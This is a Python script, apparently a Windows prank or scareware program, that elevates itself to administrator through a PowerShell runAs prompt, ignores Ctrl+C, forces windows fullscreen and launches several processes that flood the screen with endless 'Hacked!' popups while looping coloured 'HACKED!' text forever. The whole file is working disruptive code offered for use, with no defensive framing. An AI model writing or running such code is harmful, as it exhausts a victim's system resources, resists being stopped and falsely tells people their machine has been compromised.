import colorama
from colorama import Fore
import random
import sys
import os
import ctypes
import subprocess
import signal
import tkinter as tk
from multiprocessing import Process, cpu_count

colorama.init(autoreset=True)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    script = sys.argv[0]
    params = ' '.join([f'"{param}"' for param in sys.argv[1:]])
    cmd = f'python {script} {params}'
    
    try:
        subprocess.run(["powershell", "-Command", f"Start-Process cmd -ArgumentList '/k {cmd}' -Verb runAs -WindowStyle Maximized"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Failed to run script as admin: {e}")
        sys.exit(1)

def maximize_terminal():
    if os.name == 'nt':  # Windows
        os.system("powershell -Command \"(new-object -com shell.application).windows() | foreach-object { $_.fullscreen = $true }\"")
    else:
        print("Maximizing terminal is not supported on this OS.")

def signal_handler(sig, frame):
    pass  # Ignore Ctrl+C

# Set the signal handler for Ctrl+C
signal.signal(signal.SIGINT, signal_handler)

def create_popup():
    # Create a Tkinter window
    hacked_window = tk.Tk()
    hacked_window.title("Hacked!")
    
    width = 200
    height = 100
    screen_width = hacked_window.winfo_screenwidth()
    screen_height = hacked_window.winfo_screenheight()
    x = random.randint(0, screen_width - width)
    y = random.randint(0, screen_height - height)
    hacked_window.geometry(f"{width}x{height}+{x}+{y}")

    frame = tk.Frame(hacked_window)
    frame.pack(pady=20)

    label = tk.Label(frame, text="Hacked!")
    label.pack()

    button = tk.Button(frame, text="Ok", command=hacked_window.destroy)
    button.pack()

    # Run the Tkinter event loop in a non-blocking way
    hacked_window.after(1, hacked_window.destroy)
    hacked_window.update()

def show_hacked_message():
    # Create multiple popups rapidly
    while True:
        for _ in range(9999999):  # Adjust the number of popups to display
            create_popup()

def main():
    # Ensure the script is running as admin
    if not is_admin():
        run_as_admin()
        sys.exit(0)

    maximize_terminal()

    # Start the Tkinter popups in separate processes to handle large number of popups
    num_processes = min(cpu_count(), 8)  # Use up to 8 processes (or number of CPUs, whichever is smaller)
    processes = [Process(target=show_hacked_message) for _ in range(num_processes)]
    
    for process in processes:
        process.start()
    
    # Main loop for printing ASCII art
    ascii_art = "HACKED!"
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
    
    while True:
        color = random.choice(colors)
        print(color + ascii_art, end=' ')
        sys.stdout.flush()  # Ensure the output is immediately displayed

if __name__ == '__main__':
    main()
